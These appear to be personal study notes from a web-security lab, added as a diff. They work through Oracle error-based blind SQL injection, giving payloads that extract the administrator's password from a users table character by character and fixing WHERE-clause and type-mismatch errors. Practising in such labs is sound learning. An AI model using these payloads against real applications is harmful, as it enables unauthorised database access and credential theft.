@@ -1,0 +1,32 @@
+AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(password, 1, 1) > 'm') THEN TO_CHAR(1/0) ELSE NULL END FROM users)
+
+i am getting errors man 
+first, for ORACLE, SUBSTRING becomes SUBSTR and i use TO_CHAR(1/0) to prevent unexpected errors.
+so the resulting command will be 
+- ' AND (SELECT CASE WHEN (user='administrator' AND SUBSTR(password,1,1)>'a') THEN TO_CHAR(1/0) ELSE 'a' END FROM users)='a'--
+
+this gives error 500 even when i change the value of the equality. and a character cannot have two values.
+
+FIGURED---------
+
+the error is happening becuase there is no where clause, so the uery returns more than one rows. 
+it happens cos the place where i am checking for the exact row i am looking for (a row with administrator user) does not get executed cos it is in a if-block
+hence, the row we wanna return the condition must be esplicitly stated, in a where clause preferably at the end.
+
+so the query becomes 
+- ' AND (SELECT CASE WHEN (SUBSTR(password,1,1)>'a') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--
+
+
+then i tried 
+
+' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
+
+this works,it gives status code 200, and when i change the condition to 1=1 it gives error code 500.
+
+BUT
+
+' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 1 END FROM dual)=1--. the command before should work
+but it aint working,it only works when i change the integer 1 to string like '1'
+
+for this error, it is because of type error. cos TO_CHAR(1/0) returns a string and comparing it to an integer gives an error
+so all types in a query must match 
